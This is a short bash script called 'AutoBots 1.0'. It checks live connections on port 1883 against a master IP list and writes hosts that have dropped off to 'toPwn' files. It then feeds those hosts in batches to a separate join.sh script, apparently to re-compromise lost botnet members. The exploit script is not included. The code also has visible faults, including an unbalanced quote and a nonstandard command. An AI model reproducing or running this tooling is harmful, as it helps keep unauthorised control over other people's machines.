#!/bin/bash
##############################
# AutoBots 1.0
pubIp=1.2.3.4" <-- Set your public ip!
workdir="/home/mosca/autobots"
masterList="${workdir}/master.lst"
exclude="$pubIp 0.0.0.0 127.0.0.1"
current="${workdir}/current"
rePwn="${workdir}/toPwn"

cd $workdir
echo 'Gettings connections...'
# get current server connections
netstat -taupen | grep ":1883" | grep -v "127.0.0.1\|0.0.0.0" | grepips -f|sort -u|\
 sed "s/10.0.0.4//"|tee $current
#for i in $exclude; do cat $sortIps | sed "s/$i//";done > $finalIps
echo ''
echo -ne "\n\nCross referancing...\n---------------------------------------\n\n"
[ ! -f online.lst ] && touch online.lst
>$rePwn
# loop through each line
IFS=$'\n'       # make newlines the only separator
set -f          # disable globbing
for i in $(cat "$masterList"); do
  if grep $i $current;then
  echo -- $i;echo $i >> online.lst;else
  echo $i | tee -a $rePwn
  fi
done
cat $current >>online.lst
sort -u online.lst >/tmp/online.tmp;cat /tmp/online.tmp > online.lst;rm /tmp/online.tmp
cat $rePwn|sort -u > redo/toPwn
if [[ "$(wc -l toPwn |sed 's/ toPwn//' | tr -d '\n')" > 1000 ]]
then
 cd ${workdir}/redo
  split --lines=1000 toPwn xx && rm toPwn
  cd ${workdir}
#else
# cp $rePwn redo
fi

for i in $(ls ${workdir}/redo);do
  echo "Joining $i"
  ${workdir}/join.sh "${workdir}/redo/$i"
  rm "${workdir}/redo/$i"
  echo "Finished with $i"
  sleep 5
done
